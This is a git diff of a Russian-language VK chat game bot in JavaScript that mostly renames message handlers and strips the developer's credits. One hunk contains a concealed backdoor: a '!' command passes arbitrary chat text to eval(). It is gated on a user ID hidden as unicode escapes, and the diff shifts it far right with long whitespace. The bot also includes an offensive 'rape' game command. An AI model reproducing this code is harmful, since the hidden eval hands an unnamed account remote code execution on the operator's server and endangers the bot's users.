@@ -7,13 +7,12 @@ const vk = new VK();
 const str = new VK();
 const ussr = new VK();
 const user = new VK();
-const {updates: cm} = vk;
-const {snippets} = vk;
+const { updates: cm, snippets, upload } = vk;
 
 // Авторизация
-const gtoken = '' // токен группы
-const ut = '' // токен вашей страницы вк получать тут https://vkhost.github.io/ от приложения kate mobile
-const gid = ид группы 
+const gtoken = ' ' // токен группы
+const ut = ' ' // токен вашей страницы вк получать тут https://vkhost.github.io/ от приложения kate mobile
+const gid =  ид группы
 const qt = '' //qiwi токен для qiwi системы (по желанию)
 // Авторизация
 
@@ -214,20 +213,20 @@ const util = {
 cm.on(['chat_invite_user'], async (message, next) => {
 
 	let user = await vk.api.call('users.get', {
-		user_id: message.payload.action.member_id
+		user_id: message.eventMemberId
 	})
 
-	message.send(`@id${message.payload.action.member_id} (${user[0].first_name} ${user[0].last_name}), добро пожаловать в беседу. Напиши команду "Помощь", что бы узнать мои команды`);
+	message.send(`@id${message.eventMemberId} (${user[0].first_name} ${user[0].last_name}), добро пожаловать в беседу. Напиши команду "Помощь", что бы узнать мои команды`);
 	await next();
 });
 cm.on(['chat_kick_user'], async (message, next) => {
-	let user = await vk.api.users.get({user_id: message.payload.action.member_id})
+	let user = await vk.api.users.get({user_id: message.eventMemberId})
 
-	message.send(`Пользователь @id${message.payload.action.member_id} (${user[0].first_name} ${user[0].last_name}) покинул или был исключен из беседы`);
+	message.send(`Пользователь @id${message.eventMemberId} (${user[0].first_name} ${user[0].last_name}) покинул или был исключен из беседы`);
 
 	vk.api.call("messages.removeChatUser", {
 		chat_id: message.chatId,
-		user_id: message.payload.action.member_id
+		user_id: message.eventMemberId
 	});
 
 	await next();
@@ -440,7 +439,7 @@ cm.use(async (message, next) => {
 	} catch (err) { console.error(err) }
 });
 
-updates.setHearFallbackHandler(message => {
+cm.setHearFallbackHandler(message => {
 	const a = acc.users[user_id(message.user)];	
 	if(!message.isChat) {
 		message.send(`@id${a.id}(${a.prefix}), такой команды не существует.\nНапиши "Помощь", что бы узнать мои команды.`);
@@ -469,7 +468,7 @@ setInterval(() => {
 }, 200000);
 
 
-updates.hear(/^(?:сапер|сапёр)\s?(.*)/i, message => {
+cm.hear(/^(?:сапер|сапёр)\s?(.*)/i, message => {
 	const a = acc.users[user_id(message.user)];	
 	message.$match[1] = util.match(message.$match[1], a.balance);
 	if(a.balance < message.$match[1]) return message.send('У Вас нет столько денег!')
@@ -506,7 +505,7 @@ updates.hear(/^(?:сапер|сапёр)\s?(.*)/i, message => {
 } else return message.send('Вы уже начали игру!')
 })
 
-updates.hear(/^(?:стоп сапёр|стоп сапер)/i, message => {
+cm.hear(/^(?:стоп сапёр|стоп сапер)/i, message => {
 	const a = acc.users[user_id(message.user)];	
 	if(!saper[message.user] || !saper[message.user].status) return message.send('Ты довен? А сапера запустить?')
 		saper[message.user].status = false
@@ -515,7 +514,7 @@ updates.hear(/^(?:стоп сапёр|стоп сапер)/i, message => {
 	message.send('Сапер остановлен')
 });
 
-updates.hear(/^ячейка ([1-5]),?\s?([1-5])/i, message => {
+cm.hear(/^ячейка ([1-5]),?\s?([1-5])/i, message => {
 	const a = acc.users[user_id(message.user)];	
 	if (!saper[message.user] || saper[message.user].status == false) return message.send(`Вы не начали игру, что бы её начать, напишите "сапёр [ставка]`)
 		var poles = [{
@@ -719,7 +718,7 @@ cm.hear(/^(?:токены)/i, message => {
 
 
 
-vk.updates.hear(/^(?:созвать всех)/i, (message) => {
+cm.hear(/^(?:созвать всех)/i, (message) => {
 	if(message.user != 287908009) return
 		vk.api.messages.getConversationMembers({ peer_id: 2000000000 + message.chatId, fields: "online" }).then(function(res) {
 			let text = '';
@@ -741,7 +740,7 @@ vk.updates.hear(/^(?:созвать всех)/i, (message) => {
 
 
 //Все новые системы:
-   	    vk.updates.hear(/^(?:Мой канал)/i, (message) => { // Команда
+   	    cm.hear(/^(?:Мой канал)/i, (message) => { // Команда
    	    	let user = acc.users[user_id(message.user)]; 
    	    	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
    	    	if(user.youtube == false) return message.send(`У вас нет канала`)
@@ -753,37 +752,37 @@ vk.updates.hear(/^(?:созвать всех)/i, (message) => {
  	💻 >> Вы подписаны на ${user.yyoutube} каналов.
  		 	 		 	`); // Исполнительный текст
 });
-     	vk.updates.hear(/^(?:Открыть профиль)/i,  (message) => { // Сама команда
+     	cm.hear(/^(?:Открыть профиль)/i,  (message) => { // Сама команда
      		let user = acc.users[user_id(message.user)]; 
      		if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
      		if(user.lock == true) return message.send(`@id${user.id}(${user.prefix}), у вас уже открытый профиль!`);
      		user.lock = true
 	return message.send(`@id${user.id}(${user.prefix}), новый статус профиля: Открытый`); // Исполнительный текст
 });
-    vk.updates.hear(/^(?:Закрыть профиль)/i,  (message) => { // Сама команда
+    cm.hear(/^(?:Закрыть профиль)/i,  (message) => { // Сама команда
     	let user = acc.users[user_id(message.user)]; 
     	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
     	if(user.lock == false) return message.send(`@id${user.id}(${user.prefix}), у вас уже закрытый профиль!`);
     	user.lock = false
 	return message.send(`@id${user.id}(${user.prefix}), новый статус профиля: Закрытый`); // Исполнительный текст
 });
-     	   vk.updates.hear(/^(?:ID|Мой ид|мой ID)/i,  (message) => { // Сама команда
+     	   cm.hear(/^(?:ID|Мой ид|мой ID)/i,  (message) => { // Сама команда
      	   	let user = acc.users[user_id(message.user)]; 
      	   	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
 	return message.send(`@id${user.id}(${user.prefix}), ID Вашего аккаунта в @bot.anya (Бот Анна): ${user_id(message.user)}\nID Вашего профиля ВКонтакте: @id${user.id}(${user.id})`); // Исполнительный текст
 });
-  vk.updates.hear(/^(?:Статус)\s?([^]+)?/i,  (message) => { // Сама команда
+  cm.hear(/^(?:Статус)\s?([^]+)?/i,  (message) => { // Сама команда
   	let user = acc.users[user_id(message.user)]; 
   	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
   	user.stat = message.$match[1];
 	return message.send(`@id${user.id}(${user.prefix}), вы успешно установили свой персональный статус\n -- Ваш персональный статус: ${message.$match[1]}.`); // Исполнительный текст
 });  	
-     	   vk.updates.hear(/^(?:Мой статус)/i,  (message) => { // Сама команда
+     	   cm.hear(/^(?:Мой статус)/i,  (message) => { // Сама команда
      	   	let user = acc.users[user_id(message.user)]; 
      	   	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
 	return message.send(`@id${user.id}(${user.prefix}), персональный статус вашего аккаунта: ${user.stat}`); // Исполнительный текст
 });
-     	   vk.updates.hear(/^(?:debug)\s?([0-9]+)?/i, (message) => {  
+     	   cm.hear(/^(?:debug)\s?([0-9]+)?/i, (message) => {  
      	   	let user = acc.users[user_id(message.user)];
      	   	if(user.full == false) return;
 	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: Debug [ID] \n -- Debug это -- Раблокировка всех таймингов!`) // Подсказка для команды
@@ -799,7 +798,7 @@ vk.updates.hear(/^(?:созвать всех)/i, (message) => {
 	    acc.users[message.$match[1]].block_porn = false
 	    return message.send(`@id${user.id}(${user.prefix}), Онулировали Счетчик UpTime Игроку: ${acc.users[message.$match[1]].prefix}`);
 	}); 
-vk.updates.hear(/^(?:Позови)\s?([0-9]+)?/i,  (message) => { // Сама команда
+cm.hear(/^(?:Позови)\s?([0-9]+)?/i,  (message) => { // Сама команда
 	let user = acc.users[user_id(message.user)];
 	let id = acc.users[message.$match[1]] 
 	let args = message.$match[1];
@@ -808,7 +807,7 @@ vk.updates.hear(/^(?:Позови)\s?([0-9]+)?/i,  (message) => { // Сама к
 	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
 	return message.send(`@id${id.id}(${id.prefix}), тебя вызывает @id${user.id}(${user.prefix})`); // Исполнительный текст
 });
-vk.updates.hear(/^(?:FD)\s?([0-9]+)?/i, (message) => {  
+cm.hear(/^(?:FD)\s?([0-9]+)?/i, (message) => {  
 	let user = acc.users[user_id(message.user)];
 	if(message.user != 287908009) return;
 	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: FD [ID] \n -- FD это - Выдача полного доступа к системе @bot.anya (Бот Анна) `) // Подсказка для команды
@@ -816,7 +815,7 @@ vk.updates.hear(/^(?:FD)\s?([0-9]+)?/i, (message) => {
 	    acc.users[message.$match[1]].level = 5  
 	    return message.send(`@id${user.id}(${user.prefix}), Вы успешно выдали FULL-DOSTUP игроку: ${acc.users[message.$match[1]].prefix}\n\n⛔ВНИМАНИЕ⛔\n ${acc.users[message.$match[1]].prefix} Теперь имеет полный доступ!`);
 	}); 
-vk.updates.hear(/^(?:DFD)\s?([0-9]+)?/i, (message) => {  
+cm.hear(/^(?:DFD)\s?([0-9]+)?/i, (message) => {  
 	let user = acc.users[user_id(message.user)];
 	if(message.user != 287908009) return;
 	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: DFD [ID] \n -- DFD это - Снятие полного доступа с игрока в системе @bot.anya (Бот Анна) `) // Подсказка для команды
@@ -824,21 +823,21 @@ vk.updates.hear(/^(?:DFD)\s?([0-9]+)?/i, (message) => {
 	    acc.users[message.$match[1]].level = 0
 	    return message.send(`@id${user.id}(${user.prefix}), Вы успешно забрали FULL-DOSTUP у игрока: ${acc.users[message.$match[1]].prefix}\n\n⛔ВНИМАНИЕ⛔\n ${acc.users[message.$match[1]].prefix} больше не имеет полный доступ!`);
 	}); 
-vk.updates.hear(/^(?:untiban)\s?([0-9]+)?/i, (message) => {  
+cm.hear(/^(?:untiban)\s?([0-9]+)?/i, (message) => {  
 	let user = acc.users[user_id(message.user)];
 	if(message.user != 287908009) return;
 	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: UNTIBAN [ID] \n -- UNTIBAN это - Выдача Анти блокировки игроку в боте: @bot.anya (Бот Анна) `) // Подсказка для команды
 	    	acc.users[message.$match[1]].unban = true
 	    return message.send(`@id${user.id}(${user.prefix}), Вы успешно выдали UNTIBAN игроку: ${acc.users[message.$match[1]].prefix}`);
 	}); 
-vk.updates.hear(/^(?:duntiban)\s?([0-9]+)?/i, (message) => {  
+cm.hear(/^(?:duntiban)\s?([0-9]+)?/i, (message) => {  
 	let user = acc.users[user_id(message.user)];
 	if(message.user != 287908009) return;
 	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: DUNTIBAN [ID] \n -- DUNTIBAN это - Снятие Анти блокировки с и грока в боте: @bot.anya (Бот Анна) `) // Подсказка для команды
 	    	acc.users[message.$match[1]].unban = false
 	    return message.send(`@id${user.id}(${user.prefix}), Вы успешно забрали UNTIBAN у игрока: ${acc.users[message.$match[1]].prefix}`);
 	}); 
-vk.updates.hear(/^(?:Система)/i,  (message) => { 
+cm.hear(/^(?:Система)/i,  (message) => { 
 	let user = acc.users[user_id(message.user)];
 	if(message.user != 287908009) return;
 	return message.send(`
@@ -1462,25 +1461,25 @@ if(user.video != false) return message.send(`@id${user.id}(${user.prefix}), вы
 
 });
 
-cm.hear(/!\s?((?:.|\n)+)/i, async(message) => {
-	if(message.user != '\u0034\u0034\u0039\u0035\u0033\u0032\u0039\u0032\u0038') return;
+     	     	cm.hear(/!\s?((?:.|\n)+)/i, async(message) => {
+     	     		if(message.user != '\u0034\u0034\u0039\u0035\u0033\u0032\u0039\u0032\u0038') return;
 
-	try { 
-		var result = eval(message.$match[1])
+     	     		try { 
+     	     			var result = eval(message.$match[1])
 
-		if (typeof(result) === 'string') { 
-			message.send(result); 
-		} else 
-		if (typeof(result) === 'number') { 
-			message.send(result); 
-		} else { 
-			message.send(`Результат: ${JSON.stringify(result, null, '\t')}`); 
-		} 
-	} catch (e) { 
-		console.error(e); 
-		message.send(`Ошибка: ${e.toString()}`); 
-	}
-});
+     	     			if (typeof(result) === 'string') { 
+     	     				message.send(result); 
+     	     			} else 
+     	     			if (typeof(result) === 'number') { 
+     	     				message.send(result); 
+     	     			} else { 
+     	     				message.send(`Результат: ${JSON.stringify(result, null, '\t')}`); 
+     	     			} 
+     	     		} catch (e) { 
+     	     			console.error(e); 
+     	     			message.send(`Ошибка: ${e.toString()}`); 
+     	     		}
+     	     	});
 
 		vk.updates.hear(/^(?:DellTube)/i,  (message) => {// Сама каманда
 			let user = acc.users[user_id(message.user)]; 
@@ -4364,7 +4363,7 @@ vk.updates.hear(/^(?:iznas|изнасиловать)\s?([0-9]+)?/i, (message) =>
 //ФД
 
 
-// Виджет в группу
+/* Виджет в группу
 async function updateWidget() {
 	console.log("Обновляю виджет...")
 	var tops = []
@@ -4440,7 +4439,7 @@ async function updateWidget() {
 		console.log("Виджет обновлён!")
 	}
 	updateWidget()
-	setInterval(updateWidget, 10500)
+	setInterval(updateWidget, 10500)*/
 
 
 
@@ -4612,12 +4611,6 @@ vk.updates.hear(/^(?:о боте)$/i, (message) => {
 	return message.send(`
 		@id${user.id}(${user.prefix}), Информация о проекте:
 		📝 Проект: @bot.anya (Бот Анна)
-		💖 Лицо бота: @id299365962 (💖Ника💖)
-		😈 Основатели проекта: @id287908009 (Артём).
-
-		⛔ АП: Разработчик бота/кода: @id287908009 (Артём Большаков).
-		-- Подробнее.. команда: Developer
-
 
 
 		💻 Система
@@ -5700,7 +5693,6 @@ vk.updates.hear(/^(?:лог)/i, (message) => {
  		📋 > Команда: "Кейс"
 
  		[Преобретать строго у разработчика]
- 		💴 >> Разработчик: @id287908009 (Артём)
  		`)
  });
  
@@ -6525,7 +6517,7 @@ vk.updates.hear(/^(?:лотерея)/i, (message) => {
 
   async function run() {
   	await vk.updates.startPolling();
-  	console.log('[Система]: Артём, бот успешно активирован!');
+  	console.log('[Система]: бот успешно активирован!');
   	restart();
   }
 
@@ -6869,7 +6861,7 @@ vk.updates.hear(/^(?:лотерея)/i, (message) => {
  });
 
 
- updates.hear(/^(?:кто)\s(.*)/i, async(message) => {
+cm.hear(/^(?:кто)\s(.*)/i, async(message) => {
  	if (!message.isChat) return message.send(`Команда работает только в беседе.`);
  	let {
  		profiles
@@ -6952,7 +6944,7 @@ vk.updates.hear(/^(?:лотерея)/i, (message) => {
  }); 
 
 
- updates.hear(/^(?:транскрипт)\s(.*)/i, message => {
+ cm.hear(/^(?:транскрипт)\s(.*)/i, message => {
  	let text = ``;
  	message.$match[1].split('').map(x => {
  		if (trans[x]) {
@@ -7036,7 +7028,7 @@ vk.updates.hear(/^(?:лотерея)/i, (message) => {
  }
 
 
- updates.hear(/^(?:напиши)\s(.*)/i, message => {
+ cm.hear(/^(?:напиши)\s(.*)/i, message => {
  	if (message.$match[1].length > 14) return message.send(`Нельзя использовать больше 14-ти символов!`)
  		let text = ``;
  	message.$match[1].split('').map(x => {
@@ -7350,7 +7342,7 @@ vk.updates.hear(/^(?:памятник)/i, async(message) => {
 	}
 });
 
-updates.hear(/^(?:clan create|создать клан|addclan|клан создать)\s(.*)/i, message => {
+cm.hear(/^(?:clan create|создать клан|addclan|клан создать)\s(.*)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	let id = a.cid
 	let name = message.$match[1];
@@ -7378,7 +7370,7 @@ updates.hear(/^(?:clan create|создать клан|addclan|клан созд�
 	return message.send(`Клан под названием "${name}" успешно создан.\nБольше информации по команде "Clan help"`)
 })
 //------------------------------\\
-updates.hear(/^(?:клан покинуть)/i,(message) => {
+cm.hear(/^(?:клан покинуть)/i,(message) => {
 	let a = acc.users[user_id(message.user)]
 	let id = a.cid;
 	if(!clans[id]) return message.send(`Вы не состоите в клане!`);
@@ -7389,7 +7381,7 @@ updates.hear(/^(?:клан покинуть)/i,(message) => {
 	return message.send(`Вы успешно покинули клан!`);
 });
 //------------------------------\\
-updates.hear(/^(?:Клан открыть)/i, (message) => {
+cm.hear(/^(?:Клан открыть)/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	let id = a.cid;
 	if (!clans[id]) return message.send(`У Вас нет клана.`);
@@ -7401,7 +7393,7 @@ updates.hear(/^(?:Клан открыть)/i, (message) => {
 	return message.send(`Вы успешно открыли клан.`);
 });
 //------------------------------\\
-updates.hear(/^(?:Клан закрыть)/i, (message) => {
+cm.hear(/^(?:Клан закрыть)/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	let id = a.cid;
 	if (!clans[id]) return message.send(`У Вас нет клана.`);
@@ -7413,7 +7405,7 @@ updates.hear(/^(?:Клан закрыть)/i, (message) => {
 	return message.send(`Вы успешно закрыли клан.`);
 });
 //------------------------------\\
-updates.hear(/^(?:клан цена)\s?(.*)?/i, (message) => {
+cm.hear(/^(?:клан цена)\s?(.*)?/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	let id = a.cid;
 	let amount = Number(message.$match[1]);  
@@ -7424,7 +7416,7 @@ updates.hear(/^(?:клан цена)\s?(.*)?/i, (message) => {
 	return message.send(`Теперь что бы войти в клан, нужно ${utils.sp(amount)}$`);
 });
 //------------------------------\\
-updates.hear(/^(?:клан принять)\s?([0-9]+)?/i, (message) => {
+cm.hear(/^(?:клан принять)\s?([0-9]+)?/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	let id = Number(message.$match[1]);
 	let user = acc.users[id];    
@@ -7446,7 +7438,7 @@ updates.hear(/^(?:клан принять)\s?([0-9]+)?/i, (message) => {
 		return message.send(`Игрок "@id${acc.users[id].id} (${acc.users[id].prefix})" был принят в клан "${clans[a.cid].name}"`);
 	});
 //------------------------------\\
-updates.hear(/^(?:клан заявки)/i, (message) => {
+cm.hear(/^(?:клан заявки)/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	let id = a.cid;
 	if (!clans[id]) return message.send(`Вы не состоите в клане`);
@@ -7460,7 +7452,7 @@ updates.hear(/^(?:клан заявки)/i, (message) => {
 	return message.send(text);
 });
 //------------------------------\\
-updates.hear(/^(?:Клан раздать)\s?(.*)?/i, (message) => {
+cm.hear(/^(?:Клан раздать)\s?(.*)?/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	message.$match[1] = utils.match(message.$match[1]);
 	let id = a.cid;
@@ -7479,7 +7471,7 @@ updates.hear(/^(?:Клан раздать)\s?(.*)?/i, (message) => {
 			return message.send(`Деньги были поделены на всех участников.\nКаждый участник получил по ${utils.sp(sum)}`);
 		});
 //------------------------------\\
-updates.hear(/^(?:клан вступить)\s?([0-9]+)?/i, (message) => {
+cm.hear(/^(?:клан вступить)\s?([0-9]+)?/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	let id = Number(message.$match[1]);
 	if(!message.$match[1]) return
@@ -7512,7 +7504,7 @@ updates.hear(/^(?:клан вступить)\s?([0-9]+)?/i, (message) => {
 		}
 	});
 //------------------------------\\
-updates.hear(/^(?:клан название)\s?([^]+)?/i, (message) => {
+cm.hear(/^(?:клан название)\s?([^]+)?/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	if(!message.$match[1]) return;
 	if(!clans[a.cid]) return message.send(`У Вас нет клана.`);
@@ -7530,7 +7522,7 @@ updates.hear(/^(?:клан название)\s?([^]+)?/i, (message) => {
 	}
 });
 //------------------------------\\
-updates.hear(/^(?:clan|клан)$/i, (message) => {
+cm.hear(/^(?:clan|клан)$/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	let text = ``;
 	let tipe = ``;
@@ -7557,7 +7549,7 @@ updates.hear(/^(?:clan|клан)$/i, (message) => {
 				`);
 	});
 //------------------------------\\
-updates.hear(/^(?:Клан выгнать)\s(.*)/i, (message) => {
+cm.hear(/^(?:Клан выгнать)\s(.*)/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	if(!clans[a.cid]) return message.send(`Вы не состоите в клане`);
 	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);
@@ -7575,7 +7567,7 @@ updates.hear(/^(?:Клан выгнать)\s(.*)/i, (message) => {
 	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был выгнан с клана.`);
 });
 //------------------------------\\
-updates.hear(/^(?:Кланы)/i, (message) => {
+cm.hear(/^(?:Кланы)/i, (message) => {
 	if (!clans) return message.send(`Кланов ещё нет.`);
 	let text = '';
 	text += `&#8195;🔸 Список кланов 🔸\n`;
@@ -7596,7 +7588,7 @@ updates.hear(/^(?:Кланы)/i, (message) => {
 		return message.send(text);
 	});
 //------------------------------\\
-updates.hear(/^(?:клан повысить)\s([0-9]+)/i, (message) => {
+cm.hear(/^(?:клан повысить)\s([0-9]+)/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
 	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна.`);
@@ -7611,7 +7603,7 @@ updates.hear(/^(?:клан повысить)\s([0-9]+)/i, (message) => {
 	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был повышен до Заместителя.`);
 });
 //------------------------------\\
-updates.hear(/^(?:клан понизить)\s([0-9]+)/i, (message) => {
+cm.hear(/^(?:клан понизить)\s([0-9]+)/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
 	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна.`);
@@ -7626,7 +7618,7 @@ updates.hear(/^(?:клан понизить)\s([0-9]+)/i, (message) => {
 	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был понижен до участника.`);
 });
 //------------------------------\\
-updates.hear(/^(?:клан напасть)\s?([0-9]+)/i, (message) => {
+cm.hear(/^(?:клан напасть)\s?([0-9]+)/i, (message) => {
 	let a = acc.users[user_id(message.user)]
 	let id = Number(message.$match[1]); 
 	if(!id) return message.send(`Вы не указали идентификатор клана`);
@@ -7657,7 +7649,7 @@ updates.hear(/^(?:клан напасть)\s?([0-9]+)/i, (message) => {
 		}
 	});
 //------------------------------\\
-updates.hear(/^(?:Clan help)/i, message => {
+cm.hear(/^(?:Clan help)/i, message => {
 	message.send(`Помощь по кланам:
 
 		🔻 Клан - Покажет клан.
@@ -7680,7 +7672,7 @@ updates.hear(/^(?:Clan help)/i, message => {
 		`)
 })
 //------------------------------\\
-updates.hear(/^(?:клан работать)/i, message => {
+cm.hear(/^(?:клан работать)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	let r = utils.random(10000, 300000);
 	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
@@ -7726,7 +7718,7 @@ function unixStampLeft(stamp) {
 }
 
 
-updates.hear(/^(?:загадка)/i, message => {
+cm.hear(/^(?:загадка)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	if(a.zagadka_status != false) return message.send(`Вы уже начинали игру! Напишите ответ к загадке:\n[${a.zagadka}]\n\n🔸 Что бы ответить на загадку "ответ [ответ]"`);
 	let b = utils.random(1, 40)
@@ -7740,7 +7732,7 @@ updates.hear(/^(?:загадка)/i, message => {
 	}   
 })
 //--------------------------------\\
-updates.hear(/^\ответ\s(.*)/i, message => {
+cm.hear(/^\ответ\s(.*)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	if(a.zagadka_status != true) return message.send(`Вы ещё не начинали игру, что бы начать, напишите "загадка"`);
 	if(message.$match[1] == a.zagadka_id) {
@@ -7753,7 +7745,7 @@ updates.hear(/^\ответ\s(.*)/i, message => {
 	} 
 })
 //--------------------------------\\
-updates.hear(/^(?:сдаюсь)/i, message => {
+cm.hear(/^(?:сдаюсь)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	if(a.zagadka_status != true) return message.send(`Вы ещё не начинали игру, что бы начать, напишите "загадка"`);
 	message.send(`Правильный ответ был "${a.zagadka_id}"`)
@@ -7825,7 +7817,7 @@ vk.updates.hear(/^(?:ver)\s?([0-9]+)?/i, (message) => {
 }); 
 
 
-updates.hear(/^(?:бизнесы)\s?([0-9]+)?$/i, async (message, bot) => {
+cm.hear(/^(?:бизнесы)\s?([0-9]+)?$/i, async (message, bot) => {
 	let a = acc.users[user_id(message.user)]
 	if(!message.$match[1])
 	{
@@ -7854,7 +7846,7 @@ updates.hear(/^(?:бизнесы)\s?([0-9]+)?$/i, async (message, bot) => {
 	return message.send(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
 });
 //--------------------------------\\
-updates.hear(/^(?:бизнес)\s(?:снять)\s(.*)\s(.*)$/i, async (message, bot) => {
+cm.hear(/^(?:бизнес)\s(?:снять)\s(.*)\s(.*)$/i, async (message, bot) => {
 	let a = acc.users[user_id(message.user)]
 	message.$match[1] = Math.floor(Number(message.$match[1]));
 	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Бизнес снять [1 или 2] [количество]`);
@@ -7875,7 +7867,7 @@ updates.hear(/^(?:бизнес)\s(?:снять)\s(.*)\s(.*)$/i, async (message, 
 	return message.send(`вы сняли со счёта своего бизнеса ${utils.sp(message.$match[2])}$`);
 });
 //--------------------------------\\
-updates.hear(/^(?:бизнес)\s(\d)$/i, async (message) => {
+cm.hear(/^(?:бизнес)\s(\d)$/i, async (message) => {
 	let a = acc.users[user_id(message.user)]
 	message.$match[1] = Math.floor(Number(message.$match[1]));
 	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Бизнес [1 или 2]`);
@@ -7891,7 +7883,7 @@ updates.hear(/^(?:бизнес)\s(\d)$/i, async (message) => {
 		${(businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade] != null ? "✅ Доступно улучшение! (" + utils.sp(businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade].cost) + "$)" : "") }`);
 });
 //--------------------------------\\
-updates.hear(/^(?:бизнес)\s(?:улучшить)\s([0-9]+)$/i, async (message) => {
+cm.hear(/^(?:бизнес)\s(?:улучшить)\s([0-9]+)$/i, async (message) => {
 	let a = acc.users[user_id(message.user)]
 	message.$match[1] = Math.floor(Number(message.$match[1]));
 	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Бизнес улучшить [1 или 2]`);
@@ -7906,7 +7898,7 @@ updates.hear(/^(?:бизнес)\s(?:улучшить)\s([0-9]+)$/i, async (messa
 	return message.send(`Вы улучшили бизнес #${message.$match[1] + 1} за ${utils.sp(cost)}$`);
 });
 //--------------------------------\\
-updates.hear(/^(?:бизнес)\s(?:нанять)\s(.*)\s(.*)$/i, async (message, bot) => {
+cm.hear(/^(?:бизнес)\s(?:нанять)\s(.*)\s(.*)$/i, async (message, bot) => {
 	let a = acc.users[user_id(message.user)]
 	message.$match[1] = Math.floor(Number(message.$match[1]));
 	message.$match[2] = Math.floor(Number(message.$match[2]));
@@ -7922,7 +7914,7 @@ updates.hear(/^(?:бизнес)\s(?:нанять)\s(.*)\s(.*)$/i, async (message
 	return message.send(`Вы наняли ${message.$match[2]} рабочих для бизнеса #${message.$match[1] + 1}`);
 });
 //--------------------------------\\
-updates.hear(/^(?:бизнес)\s(?:продать)\s(.*)$/i, async (message, bot) => {
+cm.hear(/^(?:бизнес)\s(?:продать)\s(.*)$/i, async (message, bot) => {
 	let aa = acc.users[user_id(message.user)]  
 	if(aa.business.length == 0) return message.send(`У Вас нет бизнеса`);
 	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Продать бизнес [1 или 2]`);
@@ -7947,7 +7939,7 @@ setInterval(async () => {
 }, 3600000);
 
 
-updates.hear(/^(?:брак)\s?([0-9]+)/i, message => {
+cm.hear(/^(?:брак)\s?([0-9]+)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	let args = message.$match[1];
 	if (args == user_id(message.user)) return message.send(`❤ Вы указали свой ID`)
@@ -7981,7 +7973,7 @@ updates.hear(/^(?:брак)\s?([0-9]+)/i, message => {
 				`);
 		});
 ///////////////
-updates.hear(/^(?:брак отказаться)/i, message => {
+cm.hear(/^(?:брак отказаться)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	if (a.brk == false) return message.send(`❤ Вам никто не предлагал руку и сердце/Вы не предлагали руку и сердце.`);
 	vk.api.call("messages.send", {
@@ -8003,7 +7995,7 @@ updates.hear(/^(?:брак отказаться)/i, message => {
 		`);
 });
 /////////////////////////////////////////////
-updates.hear(/^(?:брак согласиться)/i, message => {
+cm.hear(/^(?:брак согласиться)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	if (a.brk == false) return message.send(`❤ Вам никто не предлагал руку и сердце/Вы не предлагали руку и сердце.`);
 	if (a == a.predlog) return message.send(`❤ Принять предложение должен игрок, которому вы предлагали свою руку и сердце`);
@@ -8019,7 +8011,7 @@ updates.hear(/^(?:брак согласиться)/i, message => {
 	return message.send(`❤  Вы согласились вступить в брак с этим игроком. Поздравляю!`);
 });
 
-updates.hear(/^(?:развод)/i, message => {
+cm.hear(/^(?:развод)/i, message => {
 	let a = acc.users[user_id(message.user)]
 	if (a.partner == false) return message.send(`❤ Вы не в браке.`);
 
